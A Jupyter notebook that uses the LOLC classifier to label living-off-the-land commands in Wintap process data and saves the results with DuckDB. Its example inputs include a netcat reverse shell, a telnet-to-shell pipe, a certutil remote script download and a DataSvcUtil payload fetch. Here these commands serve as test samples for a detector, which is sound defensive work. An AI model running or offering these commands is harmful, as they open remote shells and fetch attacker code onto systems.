# Deriving labels for Wintap LOL using the "Living off the Land Classifier (LOLC)"
Source: (https://github.com/adobe/libLOL)

LOLC has pre-trained models for Linux and Windows LOL commands. In this notebook, we'll run all the unique commands+args found in a Wintap dataset thru LOLC and save off the results.

## Python Setup Instructions
Note: LOLC is very tempermental and this is the best cross-platform setup we've found so far.

```
conda create -n lolc python=3.8
conda activate lolc
pip install lolc
pip install scikit-learn==0.24.2
```

## Examples for Linux and Windows
Notes:
* Platform type refers to the data model that will be used for checking commands, not the platform you're running on.
* When selecting WINDOWS, there may be spurious errors when the model is first loaded. These can be ignored.
    * The errors start with `Invalid command: `
* When running the lolc function, it will generate misc log messages which can also be ignored.

In [ ]:
from lol.api import LOLC, PlatformType
lolc=LOLC(PlatformType.LINUX) # allowed parameters are PlatformType.LINUX and PlatformType.WINDOWS
commands=['nc -nlvp 1234 & nc -e /bin/bash 10.20.30.40 4321',
          'iptables -t nat -L -n',
          'telnet 10.20.30.40 5000 | /bin/sh | 10.20.30.50 5001']
classification, tags = lolc(commands)
for command, status, tag in zip (commands, classification, tags):
    print(command)
    print(status)
    print(tag)
    print("")

In [ ]:
from lol.api import LOLC, PlatformType
lolc=LOLC(PlatformType.WINDOWS) # allowed parameters are PlatformType.LINUX and PlatformType.WINDOWS
commands=['certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt',
          'explorer.exe c:\\temp',
          'DataSvcUtil /out:C:\\Windows\\System32\\calc.exe /uri:https://11.11.11.11/xxxxxxxxx?encodedfile']
classification, tags = lolc(commands)
for command, status, tag in zip (commands, classification, tags):
    print(command)
    print(status)
    print(tag)
    print("")

# Run against a Wintap Dataset
The strategy here is to extract all of the unique command+args from the PROCESS table. Then pass those into lolc(), effectively one at a time. Save off the results in parquet file that can be joined back up on command+arg.

Note that as we need 2 values back (classification and tag), there is some messiness involved. Basically, have the function return a string, then later split that string. Yuck.

In [ ]:
import duckdb
from duckdb.typing import VARCHAR
from lol.api import LOLC, PlatformType

%load_ext magic_duckdb
con = duckdb.connect()
%dql -co con
lolc=LOLC(PlatformType.WINDOWS)

# Define wintap data needed
%dql create view process_uber_summary as from '/Users/johnson30/data/wintapv6/ACME4/stdview-20240819-20240923/process_uber_summary.parquet'
%dql create view lolbas AS FROM read_csv_auto('/Users/johnson30/data/wintapv6/lookups/benignware/lolbas.csv',header=true,normalize_names=1)

# Define function to call lolc and register with DuckDB
def is_bad(cmd:str) -> str:
    classification, tags = lolc([cmd])
    # TODO: Figure out how to return a tuple or list?
    return classification[0]+"|"+tags[0]

con.create_function("lol_is_bad", is_bad)



## Call as a function in DuckDB!

In [ ]:
sql='''
create or replace table lolc_results
as
select *,
    -- No easy way to re-use the function call, so just duplicate it.
    --lolc_sez: lol_is_bad(concat_ws(' ',process_name, args)),
    lolc_class: split(lol_is_bad(concat_ws(' ',process_name, args)),'|')[1],
    lolc_tag: if(lolc_class == 'NEUTRAL', null, split(lol_is_bad(concat_ws(' ',process_name, args)),'|')[2])
from (
    select p.process_name, p.args, list(distinct command_category) lolbas_cats, count(*) num_rows
    from main.process_uber_summary p
    join lolbas l on lower(l.filename)=p.process_name
    group by all
)
'''
con.sql(sql)


In [ ]:
%dql show tables

In [ ]:
%dql select lolc_class, count(distinct lolc_tag), sum(num_rows), count(*) from lolc_results group by all order by all

# Copy to parquet file
For now, just copy to local directory. 

In [ ]:
%dql copy lolc_results to 'lolc_results.parquet' (format parquet)